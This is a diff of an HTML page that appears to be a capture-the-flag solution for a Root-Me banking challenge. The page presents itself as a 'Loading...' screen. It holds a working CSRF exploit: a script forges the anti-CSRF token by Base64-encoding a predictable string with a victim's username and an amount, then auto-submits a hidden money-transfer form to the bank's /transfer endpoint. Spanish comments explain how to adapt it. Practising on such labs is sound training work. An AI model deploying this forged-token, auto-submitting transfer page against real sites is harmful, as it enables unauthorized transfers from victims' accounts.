@@ -1,10 +1,39 @@
 <!DOCTYPE html>
-<html>
-  <body onload="document.forms[0].submit()">
-    <form action="https://bankme-2.challenges.pro.root-me.org/transfer" method="POST">
-      <input type="hidden" name="recipient" value="hodei" />
-      <input type="hidden" name="amount" value="10" />
-      <input type="hidden" name="token" value="Q1NSRnNfNHIzX2MwMGw6YWl0b3I6OTg=" />
-    </form>
-  </body>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Loading...</title>
+</head>
+<body>
+<h1>Loading...</h1>
+ 
+    <form id="csrfForm" action="https://bankme-2.challenges.pro.root-me.org/transfer" method="POST">
+<input type="hidden" name="token" id="token" value="">
+<input type="hidden" name="recipient" value="eustakio"> <!-- Cambia "tu_usuario" por tu nombre de usuario -->
+<input type="hidden" name="amount" value="1000000"> <!-- Cambia "100" por la cantidad que deseas transferir -->
+</form>
+ 
+    <script>
+        // Función para generar el token basado en el usuario y la cantidad
+        function generateToken(username, amount) {
+            const base = "CSRFs_4r3_c00l";
+            const token = `${base}:${username}:${amount}`;
+            return btoa(token); // Codifica en Base64
+        }
+ 
+        // Cambia "usuario_rico" por el nombre de usuario de la víctima
+        const victimUsername = "l0ve_0racle_l4rry";
+        const amount = 6241751369; // Cantidad que deseas transferir
+ 
+        // Genera el token
+        const token = generateToken(victimUsername, amount);
+ 
+        // Asigna el token generado al campo oculto del formulario
+        document.getElementById("token").value = token;
+ 
+        // Envía el formulario automáticamente
+        document.getElementById("csrfForm").submit();
+</script>
+</body>
 </html>
